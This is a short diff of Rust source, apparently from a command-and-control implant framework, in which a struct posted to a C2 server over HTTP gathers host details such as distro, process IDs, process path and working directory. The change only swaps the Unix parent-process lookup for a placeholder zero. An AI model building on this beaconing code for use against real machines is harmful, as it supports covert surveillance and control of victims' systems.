@@ -423,7 +423,8 @@ pub struct LightPayload {
 
 
 }
-use std::os::unix::process::parent_id;
+//use std::os::unix::process::parent_id;
+//use std::os:
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub struct PostToC2 {
@@ -496,7 +497,8 @@ impl LinkFetch for HTTPPostC2Link {
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
             pid: process::id(),
-            ppid: parent_id(),          
+            //TODO parent
+            ppid: 0,          
             process_name : process_name,
             process_path: process_path,
             working_dir : working_dir(),
